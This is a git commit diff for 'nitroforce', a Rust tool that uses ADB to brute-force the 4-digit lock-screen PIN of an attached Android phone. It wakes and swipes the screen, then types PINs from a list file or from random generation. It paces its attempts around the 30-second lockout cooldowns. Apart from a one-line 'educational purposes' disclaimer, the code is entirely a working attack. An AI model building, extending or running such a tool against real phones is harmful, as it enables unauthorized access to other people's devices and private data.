c53c3db26bc86c1b3242dc1d06d038ff7530c912
nitrogenez <nitrogenesis.developer@gmail.com>
2023-02-18 18:14:31 +0200

    v0.2.1 - Modularity update

--- src/main.rs
+++ src/main.rs
@@ -1,16 +1,18 @@
 // std
-use std::thread;
-use std::time::Duration;
 use std::env;
-use std::fs::File;
+use std::process::exit;
 
-use std::io::BufRead;
-use std::io::BufReader;
+mod pin4d;
+
+use crate::pin4d::Pin4D;
 
 
 fn print_help() {
-    println!("usage: nitroforce-rs [FILE]");
-    println!("  e.g  pinlist.txt");
+    println!("usage: nitroforce [PARAMETERS]... [FILE][TYPE]");
+    println!(" args: --from-file    [FILE]");
+    println!("       -f             [FILE]");
+    println!("       --random       [TYPE] (p4)");
+    println!("       -r             [TYPE] (p4)");
     println!("use «nitroforce-rs --help» command to display this message again");
 }
 
@@ -22,11 +24,13 @@ fn main() {
         print_help();
         std::process::exit(0);
     }
+    if args.get(1).unwrap() == &String::from("--help") || args.get(1).unwrap() == &String::from("-h") {
+        print_help();
+        exit(0);
+    }
 
     println!("This software was developed for educational purposes ONLY.");
     println!("Author do not take any responsibility for his software's users or any unfair/malicious usage.");
-
-    let pinfile = File::open(&args[1]).expect("PIN list not found");
 
     let adb_server = mozdevice::Host { ..Default::default() };
     let connected: Vec<mozdevice::DeviceInfo> = adb_server.devices().unwrap();
@@ -48,72 +52,29 @@ fn main() {
     ).unwrap();
 
 
-    // Unlocking device
-    active_device.execute_host_shell_command("input keyevent 82").unwrap();
-    thread::sleep(Duration::from_millis(100));
-    active_device.execute_host_shell_command("input swipe 408 1210 408 85").unwrap();
-    thread::sleep(Duration::from_millis(100));
+    for i in 0..=args.len() {
+        if args[i] == "--random" || args[i] == "-r" {
+            if args.get(i + 1) == None {
+                print_help();
+                exit(0);
+            }
 
-    // Necessary variables
-    let reader = BufReader::new(pinfile);
-
-    // let mut combination: String = String::new();
-    let mut attempt: u32 = 1;
-    let mut retries_limit: u16 = 5;
-
-    let mut digits: Vec<u8> = [ 0, 0, 0, 0 ].to_vec();
-
-    let mut retry = 0;
-
-    for (_index, line) in reader.lines().enumerate() {
-        let line = line.unwrap();
-
-        // ignore blank lines
-        if line == "" {
-            continue;
+            else if args.get(i + 1).unwrap() == &String::from("p4") {
+                Pin4D::random(&active_device);
+                exit(0);
+            }
         }
 
-        retry += 1;
+        else if args[i] == "--from-file" || args[i] == "-f" {
+            if args.get(i + 1) == None {
+                print_help();
+                exit(0);
+            }
 
-
-
-        if attempt == 3 {
-            println!("Exceeded limit of 3 attempts");
-            println!("From now on, there is only 1 retry before 30 second cooldown");
-
-            retries_limit = 1;
-        }
-
-        println!("Attempt {attempt}, Retry {retry}: Combination: {line}");
-
-        for i in 0..=line.len() - 1 {
-            // rust is evil.
-            let c = line.chars().nth(i).unwrap();
-            let keycode = c.to_digit(10).unwrap() as u8;
-
-            digits[i] = keycode + 7;
-        }
-
-        for i in 0..=3 {
-            active_device.execute_host_shell_command(&format!("input keyevent {:?}", digits[i])).unwrap();
-            thread::sleep(Duration::from_millis(30));
-        }
-
-
-        // rust is fucking evil
-        if retry % retries_limit == 0 {
-            attempt += 1;
-
-            thread::sleep(Duration::from_millis(80));
-            active_device.execute_host_shell_command("input keyevent 66").unwrap();
-
-            println!("Limit of {retries_limit} retries exceeded, waiting 30 seconds...");
-            thread::sleep(Duration::from_secs(30));
-
-            active_device.execute_host_shell_command("input keyevent 82").unwrap();
-            thread::sleep(Duration::from_millis(100));
-            active_device.execute_host_shell_command("input swipe 408 1210 408 85").unwrap();
-            thread::sleep(Duration::from_millis(100));  
+            else {
+                Pin4D::from_file(&args[i + 1], &active_device);
+                exit(0);
+            }
         }
     }
 }
---
+++ src/pin4d.rs
@@ -0,0 +1,153 @@
+use rand::thread_rng;
+use rand::Rng;
+
+use mozdevice::Device;
+
+use std::thread::sleep;
+use std::time::Duration;
+use std::fs::File;
+use std::io::BufRead;
+use std::io::BufReader;
+
+
+pub struct Pin4D {}
+
+
+impl Pin4D {
+
+    // Generate & push random pins
+    pub fn random(device: &Device) {
+        // Necessary variables
+        let mut comb: String = String::new();
+        let mut att: u32 = 1;
+        let mut ret_limit: u32 = 5;
+
+        let mut dig: Vec<u8> = [ 0, 0, 0, 0].to_vec();
+
+
+        // Wake device
+        device.execute_host_shell_command("input keyevent 82").expect("Failed to execute shell command");
+        sleep(Duration::from_millis(100));
+        device.execute_host_shell_command("input swipe 408 1210 508 85").expect("Failed to execute shell command");
+        sleep(Duration::from_millis(100));
+
+
+        // Generate & push 9999 combinations
+        for ret in 1..=9999 {
+
+            // Generate random combination
+            for i in 0..=3 {
+                dig[i] = thread_rng().gen_range(0..=9);
+                comb += &dig[i].to_string();  // Just for printing
+                dig[i] += 7;
+            }
+
+            // Attempt limit check
+            if att == 3 {
+                ret_limit = 1;
+                println!("Limit of 3 retries exceeded, max retries: {ret_limit}");
+            }
+            println!("ATTEMPT: {att}  RETRY: {ret}  COMBINATION: {comb}");
+
+            // Push combination
+            for i in 0..=3 {
+                device.execute_host_shell_command(&format!("input keyevent {:?}", dig[i])).expect("Failed to execute command");
+                sleep(Duration::from_millis(50));
+            }
+            comb = String::new();  // Erasing combination for printing
+
+
+            // Retry limit check
+            if ret % ret_limit == 0 {
+                println!("Limit of {ret_limit} exceeded, waiting 30 seconds...");
+                att += 1;
+
+                // Sleep is necessary for Android to understand the input
+                sleep(Duration::from_millis(80));
+                device.execute_host_shell_command("input keyevent 66").expect("Failed to execute shell command");
+                sleep(Duration::from_secs(30));
+
+                // Wake device again
+                device.execute_host_shell_command("input keyevent 82").expect("Failed to execute shell command");
+                sleep(Duration::from_millis(100));
+                device.execute_host_shell_command("input swipe 408 1210 508 85").expect("Failed to execute shell command");
+                sleep(Duration::from_millis(100));
+            }
+        }
+    }
+
+
+    // Push pin combinations from list
+    pub fn from_file(file: &String, device: &Device) {
+
+        // Opening the file
+        let file: File = File::open(file).expect("Failed to open PIN list file");
+        let reader: BufReader<File> = BufReader::new(file);
+
+        // Necessary variables
+        let mut att: u32 = 1;
+        let mut ret_limit: u32 = 5;
+        let mut dig: Vec<u8> = [ 0, 0, 0, 0].to_vec();
+
+        let mut ret: u32 = 0;
+
+
+        // Wake device
+        device.execute_host_shell_command("input keyevent 82").expect("Failed to execute shell command");
+        sleep(Duration::from_millis(100));
+        device.execute_host_shell_command("input swipe 408 1210 508 85").expect("Failed to execute shell command");
+        sleep(Duration::from_millis(100));
+
+
+        // Read the list line-by-line and push pins
+        for (_index, line) in reader.lines().enumerate() {
+            let line = line.unwrap();
+
+            // Ignore blank lines
+            if line == "" {
+                continue
+            };
+            ret += 1;
+
+
+            // Attempt limit check
+            if att == 3 {
+                ret_limit = 1;
+                println!("Limit of 3 retries exceeded, max retries: {ret_limit}");
+            }
+            println!("ATTEMPT: {att}  RETRY: {ret}  COMBINATION: {line}");
+
+
+            // Evil rust.
+            for i in 0..=line.len() - 1 {
+                let c = line.chars().nth(i).unwrap();
+                let keycode = c.to_digit(10).unwrap() as u8 + 7;
+
+                dig[i] = keycode;
+            }
+
+            // Push combination
+            for i in 0..=3 {
+                device.execute_host_shell_command(&format!("input keyevent {:?}", dig[i])).expect("Failed to execute shell command");
+                sleep(Duration::from_millis(50));
+            }
+
+            // Retry limit check
+            if ret % ret_limit == 0 {
+                println!("Limit of {ret_limit} exceeded, waiting 30 seconds...");
+                att += 1;
+
+                // Sleep is necessary for Android to understand the input
+                sleep(Duration::from_millis(80));
+                device.execute_host_shell_command("input keyevent 66").expect("Failed to execute shell command");
+                sleep(Duration::from_secs(30));
+
+                // Wake device again
+                device.execute_host_shell_command("input keyevent 82").expect("Failed to execute shell command");
+                sleep(Duration::from_millis(100));
+                device.execute_host_shell_command("input swipe 408 1210 508 85").expect("Failed to execute shell command");
+                sleep(Duration::from_millis(100));
+            }
+        }
+    }
+}
